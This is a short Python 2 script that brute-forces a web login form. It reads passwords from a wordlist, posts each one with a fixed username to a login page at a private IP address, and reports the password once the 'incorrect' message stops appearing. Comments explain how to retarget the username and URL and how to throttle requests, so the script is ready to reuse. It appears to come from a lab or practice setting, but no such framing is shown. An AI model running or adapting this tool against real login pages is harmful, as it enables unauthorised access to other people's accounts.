import string
import urllib
import urllib2
import re
import time
import sys
import os
input_file = open('/root/Desktop/Wordlist.txt')
for guess in input_file.readlines():
	i = guess.strip("\r\n")
	# Set user name to crack - change username within single quotes to desired username
	postdata = urllib.urlencode({'username': 'hacker','password': i})
	#uncomment below to debug post data 
	#print postdata
	# Set URL to page receiving login POST data - Change url within single quotes 
	content = urllib2.urlopen('http://10.25.2.81/login.php',postdata).read()
	#uncomment below to debug returned content 
	#print content
	matches = re.findall(r'(?i)password.*?is incorrect.', content)
	#uncomment below to debug regex query
	#print matches
	if len(matches) > 0:
	#uncomment below to debug attempted passwords
		print i + " - is not the password"
		#uncomment below to throttle down script speed - change sleep timer as needed
		#time.sleep(0.1)
		continue
	else:
		print "\n\nPassword found - " + i
		break